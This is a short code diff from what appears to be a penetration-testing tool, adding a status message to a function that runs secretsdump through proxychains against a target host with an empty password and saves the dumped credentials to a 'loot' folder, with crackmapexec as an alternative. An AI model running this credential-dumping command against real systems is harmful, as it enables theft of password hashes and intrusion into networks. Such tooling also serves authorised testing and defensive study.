@@ -60,6 +60,8 @@ def config_check():
 
 def mt_execute(username, ip, method, secretsdump_path):
 
+    print('{} Dumping {} via user {}'.format(gold_plus, ip, username))
+
     if method == 'secretsdump':
         os.system('sudo proxychains python3 {} {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}\''.format(secretsdump_path, username, ip, cwd, ip))
     elif method == 'crackmapexec':
